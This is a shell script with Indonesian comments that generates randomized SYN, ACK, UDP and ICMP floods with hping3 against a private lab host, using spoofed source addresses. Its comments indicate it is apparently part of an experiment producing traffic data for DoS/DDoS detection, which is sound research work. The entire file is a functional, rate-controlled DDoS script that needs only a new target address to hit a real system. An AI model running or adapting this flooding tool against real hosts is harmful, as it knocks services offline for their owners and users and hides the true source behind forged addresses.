#!/bin/sh
# serang_flood.sh — jalankan di Penyerang-1. Satu sesi = banyak gelombang
# flood dengan parameter acak, sebagian dari BANYAK sumber sekaligus
# (supaya unique_src_ip_per_dst tidak lagi konstan 1 -> benar-benar "DDoS").
#   sh alias_ip.sh 192.168.20 11 30
#   nohup sh serang_flood.sh 1800 > /tmp/flood.log 2>&1 &
#
# CATATAN INTENSITAS (Eksperimen 2 revisi): versi lama memakai `--flood` +
# port sumber yang berubah tiap paket, sehingga SATU gelombang meledak jadi
# JUTAAN flow 1-paket -> dataset tak terpakai (rasio ~2500:1). Versi ini:
#   - TANPA --flood: selalu dibatasi laju `-i uN` (paket per mikrodetik),
#   - `--keep`: port sumber tetap, jadi tiap instance = beberapa flow padat
#     (packet_count/byte_count tinggi = tanda flood yang jelas, jumlah flow
#     terkendali, bukan jutaan),
#   - jumlah sumber & durasi lebih kecil.
# Hasilnya ribuan flow/sesi dengan ciri flood kuat, bukan jutaan.

TARGET=192.168.30.10
LAMA=${1:-1800}
SELESAI=$(( $(date +%s) + LAMA ))
rnd() { shuf -i "$1-$2" -n 1; }

while [ "$(date +%s)" -lt "$SELESAI" ]; do
  case $(rnd 1 6) in                      # jenis flood
    1|2) MODE="-S" ;;          # SYN flood
    3)   MODE="-A" ;;          # ACK flood
    4)   MODE="-S -A" ;;       # SYN-ACK
    5)   MODE="--udp" ;;       # UDP flood
    6)   MODE="--icmp" ;;      # ICMP flood
  esac
  case $(rnd 1 4) in                      # port tujuan
    1|2) DPORT=80 ;; 3) DPORT=443 ;; 4) DPORT=$(rnd 1 1024) ;;
  esac
  LAJU="-i u$(rnd 500 8000)"              # 125-2000 paket/detik (dibatasi, tak pernah --flood)
  DATA=$(rnd 0 1200)                      # ukuran payload acak -> avg_packet_size bervariasi
  DURASI=$(rnd 5 30)
  NSRC=$(rnd 1 10)                        # 1 = DoS, >1 = DDoS (sumber dipalsukan)
  echo "$(date +%s) hping3 $MODE -p $DPORT $LAJU -d $DATA x$NSRC sumber selama ${DURASI}s"
  k=0
  while [ $k -lt $NSRC ]; do
    # --keep: port sumber tetap -> flow padat & jumlahnya terkendali
    timeout "$DURASI" hping3 $MODE --keep -p "$DPORT" $LAJU -d "$DATA" \
      -a "192.168.20.$(rnd 10 30)" "$TARGET" >/dev/null 2>&1 &
    k=$((k + 1))
  done
  wait
  sleep "$(rnd 10 40)"
done
